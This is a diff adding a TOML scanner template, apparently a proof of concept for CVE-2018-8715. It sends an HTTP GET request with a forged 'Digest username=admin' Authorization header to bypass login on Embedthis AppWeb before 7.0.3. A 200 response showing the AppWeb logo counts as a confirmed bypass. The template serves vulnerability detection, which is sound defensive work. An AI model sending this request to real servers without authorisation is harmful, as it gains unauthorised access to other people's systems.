@@ -1,0 +1,42 @@
+[info]
+author = "AVE"
+description = "通过发送带有伪造Digest认证头的HTTP GET请求，绕过Embedthis AppWeb 7.0.3之前版本的表单认证和摘要认证机制。若返回200状态码且页面包含AppWeb logo链接，则证明存在认证绕过漏洞。"
+id = "POC-AVE-2018-0213"
+name = "Embedthis AppWeb Authentication Bypass PoC"
+severity = "high"
+tags = [
+    "cve-2018-8715",
+    "appweb",
+    "auth-bypass",
+    "embedthis",
+]
+vuln_id = [
+    "CVE-2018-8715",
+    "AVE-2018-0213",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Authorization = "Digest username=admin"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ['<a class="logo" href="https://embedthis.com/">&nbsp;</a>']
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
